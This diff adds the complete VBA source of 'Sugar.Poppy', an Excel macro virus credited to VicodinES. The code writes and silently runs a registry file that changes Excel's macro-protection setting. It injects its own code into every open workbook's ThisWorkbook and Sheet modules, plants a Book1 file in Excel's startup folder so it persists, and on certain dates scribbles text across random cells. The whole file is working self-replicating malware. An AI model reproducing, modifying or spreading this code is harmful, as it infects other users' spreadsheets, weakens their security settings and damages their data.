@@ -1,0 +1,85 @@
+X97M/Sugar.Poppy
+by VicodinES
+
+VBA Source
+
+Public run1 As Boolean
+Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
+On Error Resume Next
+If UCase(Dir("c:\o6.reg")) <> "O6.REG" Or UCase(Dir("c:\o6.bat")) <> "O6.BAT" Then
+Open "c:\o6.reg" For Output As 1
+Print #1, "REGEDIT4"
+Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
+Print #1, """Options6""=dword:00000000"
+Close 1
+Open "c:\o6.bat" For Output As 1
+Print #1, "regedit /s c:\o6.reg"
+Close 1
+End If
+For x = 1 To Workbooks.Count
+WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
+If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
+If Len(VCode) > 3000 Then GoTo out
+For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
+Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
+Weins2 = Workbooks(x).VBProject.VBComponents.Item(yz).Name
+If InStr(1, Weins2, "Sheet") Then
+If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
+If Len(VCode) > 3000 Then GoTo out
+End If
+Next yz
+Next x
+out:
+If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
+If PXLS = False And run1 <> True Then
+run1 = True
+Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
+End If
+For x = 1 To Workbooks.Count
+WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
+If WeIn = 0 Then
+Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1 As Boolean" & vbCr & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & vbCr & VCode)
+End If
+For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
+Weins2 = Workbooks(x).VBProject.VBComponents.Item(yy).Name
+Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
+If Weins1 = 0 Then
+If InStr(1, Weins2, "Sheet") Then
+Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1 As Boolean" & vbCr & "Private Sub Worksheet_Activate()" & vbCr & VCode)
+End If
+End If
+Next yy
+Next x
+If PXLS = False Then
+Workbooks("Book1.").Close SaveChanges:=True
+Shell "c:\o6.bat", vbHide
+End If
+If (Day(Now) = Minute(Now)) And (Month(Now) > 9) Then
+Randomize
+For x = 1 To 200 Step Int(Rnd * 2) + 1
+ltr = Chr(65 + Int(Rnd * 22))
+Where = ltr & (Int(Rnd * 20) + 1)
+Range(Where).Select
+ActiveCell.FormulaR1C1 = "-(Dr. Diet Mountain Dew)-"
+Range(Where).Select
+With Selection.Font
+.Name = "Comic Sans MS"
+.Size = 8
+End With
+Columns(ltr & ":" & ltr).EntireColumn.AutoFit
+Selection.Font.ColorIndex = Int(Rnd * 56 + 1)
+Next x
+Range("A1").Select
+ActiveCell.FormulaR1C1 = "The -[Sugar.Poppy]- by VicodinES"
+Columns("A:A").EntireColumn.AutoFit
+End If
+
+'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-'
+'The Sugar.Poppy Excel Class Object Virus'
+'        written by VicodinES            '
+'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-'
+'       Can I have a bottle of           '
+'       WARM DIET MOUNTAIN DEW           '
+'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-'
+
+End Sub
